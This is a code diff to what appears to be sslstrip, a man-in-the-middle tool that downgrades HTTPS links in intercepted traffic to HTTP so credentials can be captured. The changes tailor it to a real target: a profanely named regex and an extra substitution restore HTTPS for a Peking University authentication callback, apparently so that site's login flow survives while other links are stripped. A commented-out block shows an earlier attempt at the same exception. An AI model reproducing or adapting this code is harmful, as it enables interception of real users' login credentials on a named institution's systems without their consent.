@@ -31,6 +31,7 @@ class ServerConnection(HTTPClient):
     urlExpression     = re.compile(r"(https://[\w\d:#@%/;$()~_?\+-=\\\.&]*)", re.IGNORECASE)
     urlType           = re.compile(r"https://", re.IGNORECASE)
     urlExplicitPort   = re.compile(r'https://([a-zA-Z0-9.]+):[0-9]+/',  re.IGNORECASE)
+    urlFucker = re.compile(r"http://w.pku.edu.cn/users/auth/pkuauth/callback", re.IGNORECASE)
 
     def __init__(self, command, uri, postData, headers, client):
         self.command          = command
@@ -138,6 +139,9 @@ class ServerConnection(HTTPClient):
 
         for match in iterator:
             url = match.group()
+            #if url == "https://w.pku.edu.cn/users/auth/pkuauth/callback":
+            #    logging.warning("don't strip callback-> " + url)
+            #    continue
 
             logging.debug("Found secure reference: " + url)
 
@@ -146,7 +150,8 @@ class ServerConnection(HTTPClient):
             self.urlMonitor.addSecureLink(self.client.getClientIP(), url)
 
         data = re.sub(ServerConnection.urlExplicitPort, r'http://\1/', data)
-        return re.sub(ServerConnection.urlType, 'http://', data)
+        data = re.sub(ServerConnection.urlType, 'http://', data)
+        return re.sub(ServerConnection.urlFucker, 'https://w.pku.edu.cn/users/auth/pkuauth/callback', data)#revive
 
     def shutdown(self):
         if not self.shutdownComplete:
